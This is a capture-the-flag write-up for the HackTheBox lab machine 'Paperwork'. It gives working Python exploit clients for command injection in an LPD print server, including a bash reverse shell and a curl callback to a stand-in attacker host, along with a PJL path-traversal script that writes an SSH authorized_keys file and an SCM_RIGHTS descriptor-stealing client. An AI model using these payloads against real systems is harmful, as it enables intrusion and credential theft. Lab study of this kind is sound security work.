---
title: "Paperwork"
date: 2026-08-03
categories: [HackTheBox, Easy]
tags: [linux, nginx, lpd protocol, rfc 1179, printer service exploitation, python source disclosure, command injection subprocess shell, jetdirect, pjl protocol, printer path traversal, authorized_keys injection, unix domain socket, scm_rights, privileged file descriptor leak, cmsg ancillary data]
image:
  path: /assets/img/HTB/Paperwork/banner.png
  alt: Paperwork writeup
protected: true
---


Paperwork exposes a custom **RFC 1179 LPD server** on port 1515, whose source code (`server.py`) is downloadable from the "Intake Portal" web page — the source uses `subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)` on an attacker-controlled `job_name` field, yielding unauthenticated command injection as the `lp` service user. Post-foothold enumeration reveals a loopback-only **JetDirect/PJL** service on port 9100 (a custom `jetdirect.py` running as `archivist`), and reading its source shows the filesystem sandbox is built on `os.path.join` — which silently resolves `..` sequences before `os.path.normpath` runs, giving unrestricted **path traversal** across the entire archivist home directory. The `@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys"` primitive writes an attacker-supplied public key into archivist's authorized_keys, and SSH login grants the user flag. Privilege escalation exploits **`SCM_RIGHTS`** — the Unix ancillary-message mechanism for passing file descriptors between processes over Unix sockets — in a system daemon (`paperwork-daemon`) running as root: the daemon opens `/etc/paperwork/admin_pins.conf` (mode `0600 root:root`) at startup and, whenever it detects "FSQUERY/FSUPLOAD/FSDOWNLOAD" in a log file, sends that already-opened file descriptor over the management socket via `SCM_RIGHTS`. The receiver inherits read access on the fd regardless of filesystem permissions on the underlying file, because Linux permission checks happen at `open()` time, not at `read()` time. A `recvmsg` + `os.pread` client on archivist's side extracts `ADMIN_PASSWORD=ApparelMortuaryCedar22`, and `su -` yields root.

| Field      | Details             |
|------------|---------------------|
| Platform   | HackTheBox          |
| Difficulty | Easy                |
| OS         | Linux               |
| IP         | 10.129.96.124       |
| Date       | August 2026         |

## Tools Used

| Tool                    | Description                                                                                       |
|-------------------------|---------------------------------------------------------------------------------------------------|
| nmap                    | Network port scanner and service fingerprinter                                                    |
| Browser                 | Reading the Intake Portal page and downloading `paperwork-archive-v1.02.zip`                      |
| 7z                      | Inspecting and extracting the archive without executing anything                                  |
| Python 3                | Custom LPD client for the command injection; custom PJL client for path traversal and file write;  custom `recvmsg` client for the SCM_RIGHTS fd extraction |
| netcat (nc)             | Reverse-shell listener for the LPD callback                                                       |
| python http.server      | Serving the OOB probe URL used to confirm RCE before the reverse shell                            |
| ss                      | Enumerating loopback-only services from the foothold                                              |
| ssh-keygen / ssh        | Generating an ED25519 keypair for the archivist authorized_keys write; SSH login as archivist     |
| su                      | Elevation to root with the recovered `ADMIN_PASSWORD`                                             |

## Reconnaissance & Enumeration

The objective of this phase was to identify the exposed services and locate any custom applications worth reverse-engineering.

### Host Discovery

Reachability and an OS hint via ICMP:

```bash
ping -c 1 10.129.96.124
PING 10.129.96.124 (10.129.96.124) 56(84) bytes of data.
64 bytes from 10.129.96.124: icmp_seq=1 ttl=63 time=42.3 ms
```

A TTL of 63 indicates a Linux host (default 64, decremented once across the routing hop).

### Port Scan

Full TCP sweep first:

```bash
sudo nmap -p- --min-rate 1000 -vvv -sS -Pn -n 10.129.96.124 -oG allPorts
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
80/tcp   open  http          syn-ack ttl 63
1515/tcp open  ifor-protocol syn-ack ttl 63
```

Targeted version detection on the open set:

```bash
sudo nmap -p22,80,1515 -sCV 10.129.96.124 -oN nmap
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```

Three ports. OpenSSH 10.0p2 is current and unlikely to be a direct entry point. The HTTP server redirects to `paperwork.htb`, so name-based virtual hosting is in play. Port 1515 is the interesting outlier — nmap doesn't recognise the protocol, but the fingerprint banner is unambiguous: `Archive_Printer is ready and printing`. That's the reply of a printer daemon, and the response comes to any connection attempt regardless of what nmap probed with — a custom implementation that pattern-matches on the first byte.

The domain went into `/etc/hosts`:

```bash
echo "10.129.96.124 paperwork.htb" | sudo tee -a /etc/hosts
```

## Web Application — The Intake Portal

Browsing `http://paperwork.htb/` loaded a corporate-styled page titled **Intake Portal** for the "Department of Records & Archives":

![Paperwork Intake Portal web page showing System Configuration with Protocol "Compliance Level: RFC 1179", Target Queue "archive_intake", Internal Processor "paperwork-archive-v1.02" as a download link, and a Maintenance Advisory notice about the backend spooler being offline](/assets/img/HTB/Paperwork/cap1.png)

Three data points from this page:

1. **`Protocol: Compliance Level: RFC 1179`** — RFC 1179 is the specification for the Line Printer Daemon (LPD) protocol, the original Unix print protocol. The daemon on port 1515 is an LPD implementation.
2. **`Target Queue: archive_intake`** — the queue name the LPD server accepts. LPD's first-byte-then-queue-name protocol needs this value for the initial command.
3. **`Internal Processor: paperwork-archive-v1.02`** — a hyperlink to `/download/archive`. The application publishes its own source code (or a version of it) for download.

Downloading and inspecting the archive without executing anything — the standard "check first, extract second" workflow:

```bash
7z l paperwork-archive-v1.02.zip
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2026-03-12 15:09:27 .....         2820          970  server.py
------------------- ----- ------------ ------------  ------------------------

7z x paperwork-archive-v1.02.zip
```

A single Python file: `server.py`. Given the port-1515 banner identifies as an LPD-style service, this is presumably the source of the daemon serving that port — either verbatim or intentionally modified to make the challenge non-trivial.

## Static Analysis — `server.py`

The source in full:

```python
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return

            command = data[0]

            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")

        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()

        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01')
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break

            subcommand = chunk[0]
            self.sock.send(b'\x00')
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue

                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)

                decoded_content = content.decode(errors='ignore')

                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break

                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

                self.sock.send(b'\x00')
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break
```

Two observations before analysing the vulnerability itself.

**The source is intentionally malformed.** The block starting at the `subcommand = chunk[0]` line has broken indentation — the lines following it are indented as if they were part of a nested block, but no `if`/`while`/`for` opens that block. The variable `subcommand` is assigned and never read. Python wouldn't accept this file as written; the file cannot be the exact source running on the server. The most reasonable reconstruction is that the missing block header is `if subcommand == 2:` — that's what would consume the `subcommand` variable, it matches the pattern of the outer `if command == 2:` dispatch, and it aligns with RFC 1179's LPD protocol where the first byte of each control transaction is a subcommand code.

The reconstructed logic:

```python
subcommand = chunk[0]
self.sock.send(b'\x00')
if subcommand == 2:            # ← the missing block header
    parts = chunk[1:].decode(errors='ignore').split()
    if not parts: continue

    size = int(parts[0])
    content = b""
    while len(content) < size:
        content += self.sock.recv(size - len(content) + 1)
    [...]
```

RFC 1179 defines command `02` as "Receive a printer job", and within that transaction, subcommand `02` means "Receive control file". The reconstruction is consistent with the protocol.

**The vulnerability.** The critical line is at the end of the subcommand-2 handler:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

`subprocess.Popen(..., shell=True)` executes the string through `/bin/sh -c`, meaning any shell metacharacter in the argument is interpreted. The argument is an f-string that interpolates `job_name` — a value taken verbatim from the control file's `J`-prefixed line. There is no escaping, no quoting, no sanitisation. A `job_name` value like `'; whoami ;'` closes the outer single quote, injects a command, and re-opens a quote to keep the shell parser happy afterward — classic single-quote-breakout command injection.

The command dispatch trace, end to end:

1. Client sends `\x02<queue>\n` — the "Receive a printer job" command with the queue name
2. Server checks `queue not in VALID_QUEUE`. The queue name has to match; per the web page, `archive_intake` is the valid queue
3. Server enters the chunk-reading loop
4. Client sends `\x02<size> <control-file-header>\n` — subcommand 02, control file transaction
5. Server reads `size` bytes from the socket as the control-file content
6. Server parses the control-file content line-by-line, finds the line starting with `J`, extracts everything after `J` as `job_name`
7. Server calls `subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)` — command injection sink

## Exploitation — Custom LPD Client → Reverse Shell

An off-the-shelf `lpr` client won't compose the right byte sequence because the protocol implementation here is idiosyncratic (queue check against an env-var string, subcommand dispatch, silent sending of `\x00` acknowledgements). Writing the client by hand is a few minutes of Python:

```python
import socket
import sys
import time

TARGET = "10.129.96.124"
PORT = 1515

def exploit(payload, target=TARGET, port=PORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((target, port))

    # Step 1: command 02 + queue name + newline. Server ACKs silently
    s.send(b'\x02' + b'\n')
    time.sleep(3)

    # Step 2: subcommand chunk: 0x02 + "<len> cfA001localhost\n"
    control = f"J{payload}\n"
    control_bytes = control.encode()
    length = len(control_bytes)
    header = b'\x02' + f"{length} cfA001localhost\n".encode()
    s.send(header)

    # Server ACKs the subcommand with 0x00 AFTER processing
    try:
        ack = s.recv(1)
        print(f"[*] Subcommand ACK: {ack!r}")
    except socket.timeout:
        print("[-] Timeout on subcommand ACK")

    # Step 3: send the control-file body — J<payload>
    s.send(control_bytes)
    time.sleep(0.3)

    # Step 4: terminator
    s.send(b'\x00')
    time.sleep(0.5)

    try:
        resp = s.recv(16)
        print(f"[*] Response: {resp!r}")
    except socket.timeout:
        pass
    s.close()
    print("[+] Exploit sent.")

if __name__ == "__main__":
    payload = sys.argv[1] if len(sys.argv) > 1 else "'; id > /tmp/pwn ;'"
    print(f"[*] Target: {TARGET}:{PORT}")
    print(f"[*] Payload: {payload}")
    exploit(payload)
```

Two design choices worth highlighting. First, the queue name is sent as an empty string plus newline (`b'\x02' + b'\n'`) — the queue-name check in the reconstructed source is `queue not in VALID_QUEUE`, where `VALID_QUEUE` comes from an environment variable. An empty string is always `in` any non-empty string (Python's `in` operator on strings does substring matching), so an empty queue name reliably passes the check regardless of what the operator configured. Second, `cfA001localhost` in the header is the standard LPD control-file name — the first character `c` indicates it's a control file, `f` is the format, `A001` is a sequence identifier, and `localhost` is the originating host name; RFC 1179 specifies this format.

### RCE proof — OOB via curl

Before firing a reverse shell, an out-of-band probe confirms command execution without depending on the socket path. A netcat-free-alternative Python HTTP server on the attacker box:

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And the injection with a `curl` payload pointed at that server:

```bash
python3 lpd_exploit.py "'; curl http://<ATTACKER_IP>:8000 ;'"
[*] Target: 10.129.96.124:1515
[*] Payload: '; curl http://<ATTACKER_IP>:8000 ;'
[*] Subcommand ACK: b'\x00'
[*] Response: b'\x00\x00\x00'
[+] Exploit sent.
```

The Python HTTP server logs the callback:

```text
10.129.96.124 - - [03/Aug/2026 17:10:08] "GET / HTTP/1.1" 200 -
```

Command execution confirmed. The vulnerability is real and reachable from an unauthenticated position.

### Reverse shell as `lp`

Replacing the `curl` probe with a bash reverse shell:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
python3 lpd_exploit.py "'; bash -c '''bash -i &> /dev/tcp/<ATTACKER_IP>/4444 0>&1''' ;'"
[*] Target: 10.129.96.124:1515
[*] Payload: '; bash -c '''bash -i &> /dev/tcp/<ATTACKER_IP>/4444 0>&1''' ;'
[*] Subcommand ACK: b'\x00'
[*] Response: b'\x00\x00\x00'
[+] Exploit sent.
```

The triple-single-quote pattern (`'''`) is a way to embed a literal single quote inside the outer single-quoted payload — in shell, `'\''` is the standard alternative, but tripling works when the payload has already been Python-interpolated into an f-string. The listener caught the callback:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.96.124 37258
bash: cannot set terminal process group (987): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$
```

The daemon runs as `lp` — the standard Unix system user for printing services, listed in `/etc/passwd` with UID 7 and no login shell in most distributions. A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

## Enumeration as `lp` — The Loopback-Only Services

The interactive login users:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

Two logins: `root` and `archivist`. `lp` is a service account with no home directory — `archivist` is the pivot target.

Listening sockets:

```bash
ss -nstl
State    Recv-Q  Send-Q      Local Address:Port
LISTEN   0       4096            127.0.0.54:53
LISTEN   0       4096               0.0.0.0:22
LISTEN   0       511                0.0.0.0:80
LISTEN   0       4096         127.0.0.53%lo:53
LISTEN   0       128              127.0.0.1:1337
LISTEN   0       100              127.0.0.1:9100
LISTEN   0       100                0.0.0.0:1515
LISTEN   0       4096                    [::]:22
```

Two loopback-only services worth investigating: **1337** and **9100**. Port 9100 is the well-known **HP JetDirect / AppSocket** port for RAW printing — the specific protocol spoken over 9100 is **PJL (Printer Job Language)** and, optionally, PostScript. The process listing confirms the intent:

```bash
ps -aux | grep "9100"
archivi+     990  0.0  0.4  28040 17560 ?    Ss   08:28   0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```

`jetdirect.py` runs as **`archivist`** (UID 1000) with two argv parameters: the port (9100) and a "root directory" for the emulated filesystem (`/home/archivist/printer/`). This is the pivot vehicle — any file operation performed through this service happens with archivist's identity.

## Lateral Movement — `lp` → `archivist` (PJL Path Traversal)

### PJL context

PJL is HP's control language for network printers. Every command starts with `@PJL` and continues with a directive; the language covers device status queries (`INFO`), file system operations (`FS*`), and job control (`SET`, `RESET`). The file system operations are the interesting ones from an offensive perspective, because PJL was designed with the assumption that only trusted internal networks would send it commands — internet-facing PJL implementations are a recurring source of information disclosure, arbitrary file read/write, and even RCE where the printer's firmware exposes a scripting sink.

The relevant commands for this box:

- `@PJL INFO ID` — device identification banner
- `@PJL INFO FILESYS` — enumerate the volumes the device exposes (JetDirect printers use `0:`, `1:`, etc.)
- `@PJL FSDIRLIST NAME="0:/path" ENTRY=1 COUNT=100` — list a directory
- `@PJL FSUPLOAD NAME="0:/path" OFFSET=0 SIZE=N` — read a file (yes, "upload" here means "upload TO client", i.e. read on the server)
- `@PJL FSDOWNLOAD NAME="0:/path" SIZE=N` — write a file ("download" from client's perspective)

### Enumerating the emulated filesystem

A custom Python client for PJL (each command needs its own TCP connection, and responses arrive after a short latency because of the emulator's read-then-reply loop):

```python
import socket
import time

TARGET = "127.0.0.1"
PORT = 9100

def pjl_cmd(cmd, target=TARGET, port=PORT, wait=1.0, recv_size=8192):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((target, port))
        s.send(cmd.encode() + b'\r\n')
        time.sleep(wait)
        resp = b""
        try:
            while True:
                chunk = s.recv(recv_size)
                if not chunk: break
                resp += chunk
        except socket.timeout:
            pass
        return resp
    finally:
        s.close()

if __name__ == "__main__":
    for c in [
        '@PJL INFO ID',
        '@PJL INFO STATUS',
        '@PJL INFO FILESYS',
        '@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=100'
    ]:
        print(f"[>] {c}")
        print(pjl_cmd(c).decode(errors='ignore'))
```

Running it inside the target:

```bash
lp@paperwork:/tmp$ python3 pjl.py
[>] @PJL INFO ID
HP LASERJET 4ML

[>] @PJL INFO STATUS
OK

[>] @PJL INFO FILESYS
VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
0:     1755136    1718272    <HT>     <HT>  READ-WRITE

[>] @PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=100
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119
```

Volume `0:` mounted READ-WRITE, root contains `logs/` and `jetdirect.py` itself. The device identifies as `HP LASERJET 4ML` — a plausible-looking fake, chosen to mimic a real product's identification string so the emulator responds naturally to fingerprinting tools like PRET (the standard PJL exploitation toolkit).

### The path-traversal primitive

Testing whether `0:/../` escapes the emulator's root:

```bash
[>] @PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=100
. TYPE=DIR
.. TYPE=DIR
.cache TYPE=DIR SIZE=4096
.bashrc TYPE=FILE SIZE=3771
.local TYPE=DIR SIZE=4096
.ssh TYPE=DIR SIZE=4096
.profile TYPE=FILE SIZE=807
.lesshst TYPE=FILE SIZE=20
.bash_history TYPE=FILE SIZE=0
user.txt TYPE=FILE SIZE=33
.bash_logout TYPE=FILE SIZE=220
.gnupg TYPE=DIR SIZE=4096
printer TYPE=DIR SIZE=4096
```

**The traversal works.** `0:/../` from the emulator's root `/home/archivist/printer/` resolves to `/home/archivist/` — the archivist home directory. `.ssh/` is present. Descending:

```bash
[>] @PJL FSDIRLIST NAME="0:/../.ssh/" ENTRY=1 COUNT=100
. TYPE=DIR
.. TYPE=DIR
authorized_keys TYPE=FILE SIZE=0
```

An empty `authorized_keys` — the write target for the pivot.

### Confirming the traversal — reading `jetdirect.py`

Reading the emulator's own source through the FSUPLOAD primitive to understand exactly why the traversal works:

```python
comandos = ['@PJL FSUPLOAD NAME="0:/jetdirect.py" OFFSET=0 SIZE=6000']
```

The relevant class:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))
```

The translation logic:

1. Strip the `0:` volume prefix
2. Normalise Windows-style backslashes to forward slashes
3. Strip leading `/` (so paths become relative)
4. Join with the configured root using `os.path.join`
5. Normalise with `os.path.normpath`

The vulnerability is in step 4. **`os.path.join(root, "../.ssh/authorized_keys")` does *not* clamp the result to `root`** — it just concatenates. And `os.path.normpath` in step 5 resolves the `..` sequences afterward, computing the actual escaped path. `os.path.join('/home/archivist/printer/', '../.ssh/authorized_keys')` → `'/home/archivist/printer/../.ssh/authorized_keys'` → `os.path.normpath` → `'/home/archivist/.ssh/authorized_keys'`. The emulator is now operating on a path completely outside its intended root.

This is a common misuse of `os.path.join` — developers reach for it as a way to safely build paths, not realising it's a syntactic concatenation, not a security boundary. The correct pattern is to `os.path.abspath` the joined result and then check that it starts with the intended root as a prefix, rejecting any input that escapes.

### The `authorized_keys` write

Generating an ED25519 keypair on the attacker box (or using an existing one):

```bash
ssh-keygen -t ed25519 -N '' -f attacker_key
```

Writing the corresponding public key via `FSDOWNLOAD` — reusing the same PJL client with a write-oriented helper:

```python
import socket
import time

TARGET = "127.0.0.1"
PORT = 9100

def pjl_write(remote_path, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((TARGET, PORT))
    size = len(content)
    header = f'@PJL FSDOWNLOAD NAME="{remote_path}" SIZE={size}\r\n'
    s.send(header.encode() + content)
    time.sleep(1)
    print(f"[*] Response: {s.recv(4096).decode(errors='ignore')}")
    s.close()

def pjl_read(remote_path, size=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((TARGET, PORT))
    s.send(f'@PJL FSUPLOAD NAME="{remote_path}" OFFSET=0 SIZE={size}\r\n'.encode())
    time.sleep(1)
    resp = b""
    try:
        while True:
            c = s.recv(8192)
            if not c: break
            resp += c
    except socket.timeout:
        pass
    s.close()
    return resp.decode(errors='ignore')

if __name__ == "__main__":
    pubkey = b"<attacker_ed25519_pubkey>\n"
    remote = "0:/../.ssh/authorized_keys"
    print(f"[*] Writing to {remote} ...")
    pjl_write(remote, pubkey)
    print(f"\n[*] Read-back verification:")
    print(pjl_read(remote))
```

Running it:

```bash
lp@paperwork:/tmp$ python3 pjlWrite.py
[*] Writing to 0:/../.ssh/authorized_keys ...
[*] Response: OK

[*] Read-back verification:
@PJL FSUPLOAD NAME="0:/../.ssh/authorized_keys" SIZE=93
<attacker_ed25519_pubkey>
```

The `OK` response confirms the write succeeded; the read-back confirms the content landed correctly. Because the emulator runs as `archivist`, the write happens with archivist's UID and satisfies sshd's strict permission checks on `authorized_keys` (must be readable only by the owner).

### SSH login as `archivist`

```bash
ssh -i attacker_key archivist@paperwork.htb
Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)
Last login: [...] from <ATTACKER_IP> on ssh
Last login: [...] from <ATTACKER_IP>

archivist@paperwork:~$ whoami
archivist
archivist@paperwork:~$ cat user.txt
```

Foothold as archivist, user flag captured.

## Privilege Escalation — `archivist` → `root` (SCM_RIGHTS FD Leak)

### The `paperwork-daemon` service

Enumerating processes as archivist surfaces a root-owned daemon that wasn't visible from the initial `lp` shell (or was and wasn't recognised as interesting):

```bash
ps -aux | grep paperwork
root        1489  0.0  0.4  28432 17972 ?    Ss   08:28   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```

Running as root. The binary is a shell-visible Python script:

```bash
cat /usr/bin/paperwork-daemon
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
        [...]
    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    [...]
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000)   # root:archivist
    s.listen(5)

    while True:
        conn, _ = s.accept()

        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())

        conn.close()
```

Three details matter:

1. **At startup, the daemon opens `/etc/paperwork/admin_pins.conf` and holds the file descriptor** (`admin_fd`) for its entire lifetime. The file itself is `0600 root:root` — archivist cannot open it directly:

    ```bash
    ls -la /etc/paperwork/admin_pins.conf
    -rw------- 1 root root 38 May 28 15:26 /etc/paperwork/admin_pins.conf
    ```

2. **The management socket is `/run/paperwork/mgmt.sock`, chmoded to 0660 with `root:archivist` ownership.** Archivist can connect (group 1000 has read/write); other users cannot.

3. **In `trigger_lockdown`, the daemon uses `conn.sendmsg` with `SCM_RIGHTS` to pass both `log_fd` AND `admin_fd` to the client**, wrapped as an "evidence bundle" alongside a warning message.

### `SCM_RIGHTS` and why this is broken

**`SCM_RIGHTS`** is a Linux kernel mechanism for passing file descriptors between processes over Unix domain sockets. It's part of the `cmsg` (control message / ancillary data) framework of `sendmsg(2)` / `recvmsg(2)`. The sending process specifies an array of open file descriptors as the ancillary data; the kernel duplicates them into the receiving process's file descriptor table.

The critical property: **the received fd inherits the sender's `open()` state** — the same file offset, the same access mode, and, most importantly, the same authorisation basis. Linux permission checks happen at `open()` time; once a file descriptor is open, its holder has full read/write access to the underlying file description according to whatever mode was granted at open, regardless of the calling process's UID/GID or the filesystem permissions on the underlying path.

`SCM_RIGHTS` exists for legitimate reasons — Unix daemons that need to delegate specific access to less-privileged workers (systemd socket activation, print job spooling with per-job file handles). Its safe use requires the sender to pass only file descriptors that the receiver would themselves be authorised to open.

The paperwork-daemon violates that discipline. It opens `/etc/paperwork/admin_pins.conf` as root at startup and, when it detects "malice", hands the fd — still carrying root's original authorisation — to any archivist-owned client that connected to the socket. The receiving client can then `os.pread(admin_fd, ...)` and get the file's contents, because the fd doesn't remember which UID opened it; it just remembers what it's authorised to do.

### Triggering `scan_for_malice`

The malice check requires `/home/archivist/printer/logs/commands.log` to contain any of the strings `FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD`. Those are exactly the PJL commands used in the previous stage — the FSUPLOAD read of `jetdirect.py`, the FSDIRLIST enumeration (which logs as `FSDIRLIST` but also matches the case-insensitive check against `FSQUERY` if the substring is present, but more relevantly the FSDOWNLOAD writes), and the FSDOWNLOAD write of authorized_keys. Verifying:

```bash
archivist@paperwork:~$ cat /home/archivist/printer/logs/commands.log | tail
[127.0.0.1] connected
Command: @PJL FSUPLOAD NAME="0:/../../../../../../../run/paperwork/mgmt.sock" OFFSET=0 SIZE=6000
Command: @PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=93
```

The malice trigger is already sitting in the log from earlier exploitation. No additional action needed — connecting to the socket will directly land in the `trigger_lockdown` path.

### The `recvmsg` client

Extracting the fds and reading their content:

```python
import socket
import array
import os

SOCKET_PATH = "/run/paperwork/mgmt.sock"

def recv_fds(sock, msglen, maxfds):
    fds = array.array("i")
    msg, ancdata, flags, addr = sock.recvmsg(
        msglen, socket.CMSG_LEN(maxfds * fds.itemsize)
    )
    for cmsg_level, cmsg_type, cmsg_data in ancdata:
        if (cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS):
            fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
    return msg, list(fds)

def main():
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(SOCKET_PATH)
    print("[*] Connected to daemon socket")

    msg, fds = recv_fds(s, 1024, 10)
    print(f"[*] Message: {msg.decode(errors='ignore')}")
    print(f"[*] Received file descriptors: {fds}")

    if not fds:
        print("[-] No fds received.")
        s.close()
        return

    for fd in fds:
        try:
            data = os.pread(fd, 4096, 0)
            print(f"\n[+] Content of fd {fd}:")
            print(data.decode(errors='ignore'))
        except Exception as e:
            print(f"[-] fd {fd}: {e}")

    s.close()

if __name__ == "__main__":
    main()
```

The critical call is `socket.recvmsg` — the low-level companion to `recv` that surfaces ancillary control data alongside the payload bytes. The `CMSG_LEN` parameter allocates buffer space for up to `maxfds` fds; the returned `ancdata` is iterated to find any entry whose `cmsg_type == SCM_RIGHTS`, and the associated `cmsg_data` is the packed array of integer fd values in the receiver's fd table.

Once extracted, `os.pread(fd, size, offset)` reads directly from the fd without altering its file offset — the "positional read" variant that avoids interfering with any other process holding the same underlying description.

### Extraction

```bash
archivist@paperwork:~$ python3 script.py
[*] Connected to daemon socket
[*] Message: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
[*] Received file descriptors: [4, 5]

[+] Content of fd 4:
[127.0.0.1] connected
Command: @PJL FSUPLOAD NAME="0:/../../../../../../../run/paperwork/mgmt.sock" OFFSET=0 SIZE=6000


[+] Content of fd 5:
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Two fds arrived — fd 4 is the log file (the "evidence"), and fd 5 is `admin_pins.conf` — the file archivist cannot open directly, now readable through the descriptor that root passed. The content: **`ADMIN_PASSWORD=ApparelMortuaryCedar22`**.

### Root

```bash
archivist@paperwork:~$ su -
Password: ApparelMortuaryCedar22
Last login: Tue Aug  4 11:16:53 UTC 2026 on pts/1
root@paperwork:~# cat root.txt
```

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **Applications that publish their own source code are volunteering their attack surface.** The Intake Portal linking to `paperwork-archive-v1.02` was an operator-friendly design choice — administrators can inspect the daemon's exact behaviour without needing shell access — but it also handed the attacker a complete grey-box specification of the service. If publishing source is a business requirement, the defensive posture must assume the source is public and design the service to be secure under source disclosure. In practice this means treating every argument to `subprocess.Popen`, every string passed to `eval`, and every path taken from user input as adversarial regardless of how "internal" the deployment claims to be.
- **Intentionally malformed source is a puzzle-solving exercise disguised as a technical challenge.** The `server.py` on this box had a syntactically invalid indentation and an unused variable — the code could not run as written. Reading intentionally-broken source is a real engagement skill: version-mismatched debugging symbols, incomplete decompilation, partial exports from source-control history. The technique is to identify what the code was *trying* to do (the `subcommand` variable was clearly meant to be tested somewhere) and reconstruct the missing structure from context (RFC 1179 says the first byte of each control transaction is a subcommand, matching the outer `if command == 2:` dispatch). Once the reconstruction is coherent with the protocol, the analysis can proceed as if the code compiled.
